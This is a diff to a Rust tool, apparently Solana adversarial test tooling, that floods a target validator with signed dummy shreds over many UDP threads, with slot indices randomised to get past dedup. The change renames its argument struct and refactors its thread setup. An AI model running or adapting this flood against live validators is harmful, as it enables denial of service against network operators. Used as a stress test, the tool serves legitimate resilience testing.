@@ -44,21 +44,21 @@ use {
     solana_net_utils::bind_to_unspecified,
     solana_pubkey::Pubkey,
     solana_rpc_client::nonblocking::rpc_client::RpcClient,
+    std::{fmt::Debug, time::Duration as StdDuration},
     std::{
-        fmt::Debug,
         str::FromStr,
         sync::{
             atomic::{AtomicUsize, Ordering},
             Arc,
         },
         thread,
-        time::{Duration as StdDuration, Instant},
+        time::Instant,
     },
 };
 
 #[derive(Args, Debug)]
-pub struct InvalidShredsArgs {
-    /// The public key of the target validatro
+pub struct FloodSigverifyArgs {
+    /// The public key of the target validator
     #[arg(long, value_name = "PUBKEY")]
     pub target_validator: Pubkey,
 
@@ -77,16 +77,17 @@ pub struct InvalidShredsArgs {
     pub distinct_signers: u32,
 }
 
-pub async fn run(json_rpc_url: &str, args: InvalidShredsArgs) -> Result<(), String> {
-    let rpc_client =
-        RpcClient::new_with_commitment(json_rpc_url.to_owned(), CommitmentConfig::confirmed());
-
-    let InvalidShredsArgs {
+pub async fn run(
+    json_rpc_url: &str,
+    FloodSigverifyArgs {
         target_validator,
         broadcast_threads,
         total_duration,
         distinct_signers,
-    } = args;
+    }: FloodSigverifyArgs,
+) -> Result<(), String> {
+    let rpc_client =
+        RpcClient::new_with_commitment(json_rpc_url.to_owned(), CommitmentConfig::confirmed());
 
     // use validator pubkey to fetch validator tvu address and shred version
     let nodes = rpc_client
@@ -122,30 +123,31 @@ pub async fn run(json_rpc_url: &str, args: InvalidShredsArgs) -> Result<(), Stri
 
     info!(
         "JSON RPC url: {json_rpc_url}\nGoing to attack validator {target_validator} at \
-         {tvu_addr}\nwith {broadcast_threads} broadcast threads for {total_duration} seconds.",
+         {tvu_addr:?}\nwith {broadcast_threads} broadcast threads for {total_duration:?} seconds.",
     );
 
     (0..broadcast_threads)
         .map(|i| {
             let sent_shreds_count = sent_shreds_count.clone();
             let duration: StdDuration = total_duration.into();
-            let version = shred_version;
 
             // this represents the lower bound of the random distribution used below for calculating a shred's
             // slot index. We don't refresh this value so it will go stale after 1 epoch, but the attack should
             // be completed by then.
             let start_slot = start_slot.saturating_add(slots_per_epoch);
 
-            // initialize thread-local UDP socket
-            let send_socket = bind_to_unspecified().expect("Failed to bind to unspecified address");
-
-            // ring of shreds to iterate over. We replace the slot idx of a shred with a random _valid_ value
-            // before sending it out but if epochs are short than the random distro we're sampling from is small.
-            // the shorter the epochs, the larger this ring needs to be in order to bypass dedup.
-            let shreds = get_dummy_merkle_shreds(distinct_signers, version);
-
             info!("starting UDP sender thread {i}");
             thread::spawn(move || {
+                // initialize thread-local UDP socket
+                let send_socket =
+                    bind_to_unspecified().expect("Failed to bind to unspecified address");
+
+                // ring of shreds to iterate over. We replace the slot idx of a shred with a random _valid_ value
+                // before sending it out but if epochs are short than the random distro we're sampling from is small.
+                // the shorter the epochs, the larger this ring needs to be in order to bypass dedup.
+                let shreds = get_dummy_merkle_shreds(distinct_signers, shred_version);
+
+                // initialize thread-local UDP socket
                 let dist_slot = Uniform::from(0..slots_per_epoch);
                 let mut rng = SmallRng::from_entropy();
                 let mut shred_idx: u32 = 0;
@@ -168,6 +170,8 @@ pub async fn run(json_rpc_url: &str, args: InvalidShredsArgs) -> Result<(), Stri
                 }
             })
         })
+        .collect::<Vec<_>>()
+        .into_iter()
         .for_each(|b| b.join().expect("error joining broadcast thread"));
 
     info!(
@@ -198,16 +202,19 @@ fn create_merkle_data_shreds(slot: Slot, version: u16, keypair: &Keypair) -> Vec
     let shredder = Shredder::new(slot, slot.saturating_sub(1), reference_tick, version)
         .expect("Failed to create shredder");
 
-    let (shreds, _) = shredder.entries_to_merkle_shreds_for_tests(
-        keypair,
-        &[], // empty but this should still produce valid shreds
-        true,
-        Hash::default(),
-        0,
-        0,
-        &ReedSolomonCache::default(),
-        &mut ProcessShredsStats::default(),
-    );
+    // Create valid shreds but with some dummy values
+    let shreds: Vec<_> = shredder
+        .make_merkle_shreds_from_entries(
+            keypair,
+            &[], // empty but this should still produce valid shreds
+            true,
+            Hash::default(),
+            0,
+            0,
+            &ReedSolomonCache::default(),
+            &mut ProcessShredsStats::default(),
+        )
+        .collect();
 
     assert!(!shreds.is_empty());
     shreds
